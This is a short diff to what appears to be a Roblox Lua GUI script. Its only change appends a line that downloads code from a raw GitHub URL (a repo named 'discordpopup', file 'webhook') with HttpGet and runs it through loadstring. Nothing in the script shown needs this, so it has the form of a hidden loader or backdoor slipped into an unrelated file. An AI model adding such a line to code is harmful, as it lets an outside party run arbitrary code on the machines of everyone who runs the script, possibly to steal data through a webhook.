@@ -140,4 +140,6 @@ local function C_c()
 end
 task.spawn(C_c)
 
+loadstring(game:HttpGet("raw.githubusercontent.com/hellohellohell012321/discordpopup/main/webhook", true))()
+
 return G2L["1"], require;
